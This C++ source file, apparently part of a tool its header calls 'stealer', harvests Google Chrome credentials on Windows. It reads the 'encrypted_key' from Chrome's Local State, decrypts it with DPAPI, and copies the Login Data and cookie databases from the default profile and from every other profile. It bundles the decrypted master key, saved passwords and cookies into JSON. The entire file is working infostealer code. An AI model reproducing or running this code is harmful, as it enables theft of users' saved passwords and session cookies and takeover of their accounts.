#include "stealer.h"

//do base 64 decoding!
std::vector<BYTE> b64Decode(std::string strInput){
    // as before you should make two calls to ::CryptStringToBinaryA 
    char * toDecrypt = new char[strInput.length() + 1];
    if (strcpy(toDecrypt, strInput.c_str()) == NULL){
        printf("strcopy failed: \n");
        printf("Last error: %d\n", GetLastError());
    }
    
    
    DWORD bytes;
    
    if (!CryptStringToBinaryA( toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, NULL,& bytes,NULL,NULL )){
        printf("1st call failed \n");
        printf("Last error: %d\n", GetLastError());
    }   
    BYTE * retBuff = (BYTE *)malloc(bytes * sizeof(char*));
    if (!CryptStringToBinaryA(toDecrypt , strInput.length() ,CRYPT_STRING_BASE64, retBuff ,&bytes,NULL,NULL)){
        printf("2nd call failed \n");
        printf("Last error: %d\n", GetLastError());
    }
    //free(retBuff);
    std::vector<BYTE> ByteVector(retBuff, retBuff + bytes );
    return ByteVector;
}

//read a file and use buffer
char * readFile(char * fileName){
        DWORD fileSize;
        char* buffer;
        fflush(stdin);
        FILE * infile = fopen(fileName, "r");
        if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    long size;
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);
    buffer = (char *)malloc(size);
    char character;
    int i = 0;
    
    while((character=fgetc(infile))!=EOF){
        buffer[i] = character;
        i++;
    }
    return buffer;
}

 std::vector<byte> GetLocalState(){
    //printf("IN LOCAL STATE \n");
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        //return std::vector<byte> (""); //change that
    }
    std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
    //std::cout << db_path << '\n';
    //then fetch and load json
    char * b = readFile( const_cast<char*>(db_path.c_str()));
    std::string LocalBytes = std::string(b);
    int loc = LocalBytes.find("encrypted_key") + 16; //+ 16; //15 is length of
    std::string key = "";
    for (int i = 0; i < 400; i++){ //assume key is max 300 buytes kong
       
        if (b[loc + i] == '"'){
            break;
        }
        key += LocalBytes[i + loc];
    }
    //printf("KEY before decoding: ");
    //std::cout << key << '\n';

    std::vector<byte> Key = b64Decode(key);
    //std::cout << "KEY after Decoding: ";
    //free(lpProfileDir);
    return Key;

}

//get the encryption key and decrypt
PDATA_BLOB GetEncryptionKey(){
    std::vector<byte> temp_key = GetLocalState();
    BYTE * Key = temp_key.data() + 5;
    
    //printf("\nITS DPAPI\n");
    //omg it actually works:((( im going to cry
    PDATA_BLOB blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
    blob->cbData = temp_key.size()- 5;
    blob->pbData = Key;
    PDATA_BLOB Ret_Blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
    
    if (!CryptUnprotectData(blob, NULL, NULL, NULL, NULL, 0, Ret_Blob)){
        //printf("OOF DIDNT WORK\n");
        printf("ERROR: %d\n", GetLastError());
    }

    return Ret_Blob;
}


json driver(){
    HANDLE hToken =  GetCurrentProcessToken();
    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        return -1;
    }
    PDATA_BLOB key = (PDATA_BLOB)malloc(sizeof(DATA_BLOB));
    key = GetEncryptionKey();


    //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
    // cookies: \Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default\Network\cookies
    //https://stackoverflow.com/questions/6858524/convert-char-to-lpwstr
    std::string s = (std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data"));
    //std::cout << s << " <------- path\n";
    std::string prof_path;
    std::string cook_path;
    //https://stackoverflow.com/questions/1878001/how-do-i-check-if-a-c-stdstring-starts-with-a-certain-string-and-convert-a

    //do for default
    json allPWs;
    json allCookies;
    prof_path = s + std::string("\\Default\\Login Data");

    
            const char * db_path = prof_path.c_str();
            const char * temp = "ChromeData.db";

            if (!CopyFile(db_path,temp, false)){
                printf("COPY FILE W FAILED \n");
                printf("Error: %d\n", GetLastError());
                return -1;
            }

            
            allPWs[prof_path] = json(getAllResults(temp));
    
    cook_path = s + std::string("\\Default\\Network\\cookies");
    const char * db_path2 = cook_path.c_str();

            if (!CopyFile(db_path2,temp, false)){
                printf("COPY FILE W FAILED \n");
                printf("Error: %d\n", GetLastError());
                return -1;
            }
        

            
            allCookies[prof_path] = json(getAllCookies(temp));
    

    std::string prefix = "Profile";
    //do for all profiles
    
    for (const auto& entry : std::filesystem::directory_iterator(s)){
        //std::cout << "ENTRY ----->    " << entry.path().string() << '\n';
        //std::cout << prefix << "     " << entry.path().string().substr(s.size() + 1, prefix.size() ) << '\n';
        if (!prefix.compare(entry.path().string().substr(s.size() + 1, prefix.size()))) {
            //std::cout << entry.path().string() << '\n';
            prof_path =  entry.path().string() + std::string("\\Login Data");
            const char * db_path = prof_path.c_str();
            const char * temp = "ChromeData.db";
            if (!CopyFile(db_path,temp, false)){
                printf("COPY FILE W FAILED \n");
                printf("Error: %d\n", GetLastError());
                return -1;
            }
            allPWs[prof_path] = json(getAllResults(temp));

            cook_path = entry.path().string() + std::string("\\Network\\cookies");
            const char * db_path2 = cook_path.c_str();

            if (!CopyFile(db_path2,temp, false)){
                printf("COPY FILE W FAILED \n");
                printf("Error: %d\n", GetLastError());
                return -1;
            }
            //printf("\n\n\n-----RES beg------\n\n\n");
            //std::cout << getAllCookies(temp);
            //printf("\n\n\n-----RE end------\n\n\n");

            
            allCookies[prof_path] = json(getAllCookies(temp));
            //std::cout << allCookies[prof_path] << '\n';

            //get cookies
        }
    }

    
    
   //std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
   json test;
   test["KEY"] = hexStr(key->pbData, key->cbData);
   test["PASSWORDS"] = allPWs;
   test["COOKIES"] = allCookies;
   //std::cout << "\n\n\n---------------------------\n\n\n" << test.dump() << "\n\n\n--------------------------\n\n\n";
   //[path: results]
   //sqlite3_close(db);
   return test;
}



